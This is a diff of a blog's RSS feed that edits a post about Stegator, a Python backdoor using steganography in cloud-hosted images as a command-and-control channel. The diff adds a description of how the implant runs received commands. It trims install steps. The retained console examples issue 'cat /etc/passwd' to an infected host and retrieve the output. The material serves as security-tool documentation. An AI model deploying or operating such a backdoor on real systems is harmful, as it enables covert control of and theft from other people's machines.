@@ -5,8 +5,8 @@
     <description>test</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 16 Oct 2016 01:05:16 +0100</pubDate>
-    <lastBuildDate>Sun, 16 Oct 2016 01:05:16 +0100</lastBuildDate>
+    <pubDate>Sun, 16 Oct 2016 09:37:51 +0100</pubDate>
+    <lastBuildDate>Sun, 16 Oct 2016 09:37:51 +0100</lastBuildDate>
     <generator>Jekyll v3.2.0</generator>
     
       <item>
@@ -15,39 +15,15 @@
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/1modm/stegator&quot;&gt;&lt;strong&gt;Stegator&lt;/strong&gt;&lt;/a&gt; is a Python based backdoor that uses Steganography and a Cloud Image Service as a command and control server.&lt;/p&gt;
 
+&lt;p&gt;The C&amp;amp;C service insert into the images the commands using a password and the utility steghide, then the images are uploaded into the Cloud Image Service with an specific uuid used by the agent (implant) service to retrieve the image, extract the command and execute in the infected host. Once the results are obtained then are uploaded into the Cloud Image Service to be available for the C&amp;amp;C server to get the results.&lt;/p&gt;
+
 &lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Z5lqbfl.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
-&lt;h3 id=&quot;setup-and-installation&quot;&gt;Setup and Installation&lt;/h3&gt;
-
-&lt;p&gt;Linux&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# apt-get install python python-pip python-dev build-essential libsqlite3-dev
-# apt-get install steghide
-# git clone https://github.com/1modm/stegator.git &amp;amp;&amp;amp; cd stegator
-# pip install -r requirements.lst
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Windows&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- Install python 2.X https://www.python.org/downloads/windows/
-- Download https://github.com/1modm/stegator/archive/master.zip
-- Install required modules
-- Download Steghide [steghide](http://steghide.sourceforge.net/)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
 &lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
 
-&lt;p&gt;In order to run the C&amp;amp;C:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python stegator.py
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;You’ll then get into an ‘interactive’ shell which offers few commands that are:&lt;/p&gt;
+&lt;p&gt;The C&amp;amp;C server offers an ‘interactive’ shell which offers few commands that are:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; help
 
@@ -69,9 +45,7 @@ C&amp;amp;C console &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Once you’ve deployed the backdoor on a couple of systems, you can check available clients using the bots command:&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;Once you’ve deployed the backdoor on a couple of systems, you can check available clients using the bots command:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; bots
 Bot: 04:D6:27:72:A3:E9 Windows-7-6.1.7601-SP1
@@ -84,50 +58,7 @@ C&amp;amp;C console &amp;gt;
 
 &lt;p&gt;The output is the MAC address which is used to uniquely identifies the system but also gives you OS information the implant is running on.&lt;/p&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Let’s issue a command to an implant:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; cmd 04:D6:27:72:A3:E9 ipconfig
-[+] Downloading image from Cloud Service...
-[+] Uploaded image to Cloud Service
-[+] Steganography applied, image saved
-[+] Sent command ipconfig with jobid: 97ee81e0647a4f248ac47c68e8b25b88
-C&amp;amp;C console &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Lets get the results!&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; retrieve 97ee81e0647a4f248ac47c68e8b25b88
-97ee81e0647a4f248ac47c68e8b25b88: 
-Configuracin IP de Windows
-
-
-Adaptador de Ethernet Conexin de rea local:
-
-   Sufijo DNS especfico para la conexin. . : Home
-   Vnculo: direccin IPv6 local. . . : fe30::2c37:4432:4551:c71a%11
-   Direccin IPv4. . . . . . . . . . . . . . : 192.168.66.25
-   Mscara de subred . . . . . . . . . . . . : 255.255.255.0
-   Puerta de enlace predeterminada . . . . . : 192.168.66.1
-
-Adaptador de tnel isatap.Home:
-
-   Estado de los medios. . . . . . . . . . . : medios desconectados
-   Sufijo DNS especfico para la conexin. . : Home
-
-Adaptador de tnel Conexin de rea local*:
-
-   Estado de los medios. . . . . . . . . . . : medios desconectados
-   Sufijo DNS especfico para la conexin. . : 
-
-C&amp;amp;C console &amp;gt; 
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;p&gt;Let’s issue a command to an implant:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; cmd 04:00:72:3F:D6:98 cat /etc/passwd  
 [+] Downloading image from Cloud Service...
@@ -138,9 +69,7 @@ C&amp;amp;C console &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Lets get the results!&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;Lets get the results!&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; retrieve 631f4ee7328244b8b462876e1f8dd753
 631f4ee7328244b8b462876e1f8dd753: 
@@ -182,27 +111,7 @@ ftp:x:115:65534::/srv/ftp:/bin/false
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Refresh results&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;In order to retrieve new bots/command outputs but also force the client to refresh the results, use the &lt;code class=&quot;highlighter-rouge&quot;&gt;refresh&lt;/code&gt; command.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; refresh
-[+] Sending command to retrieve alive bots
-[+] Downloading image from Cloud Service...
-[+] Uploaded image to Cloud Service
-[+] Steganography applied, image saved
-[+] Sleeping 10 secs to wait for bots
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;This will send a &lt;code class=&quot;highlighter-rouge&quot;&gt;PING&lt;/code&gt; request and wait 10 seconds for them to answer.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Retrieve previous commands&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;Retrieve previous commands&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; commands
 631f4ee7328244b8b462876e1f8dd753: 'cat /etc/passwd' on 04:00:72:3F:D6:98
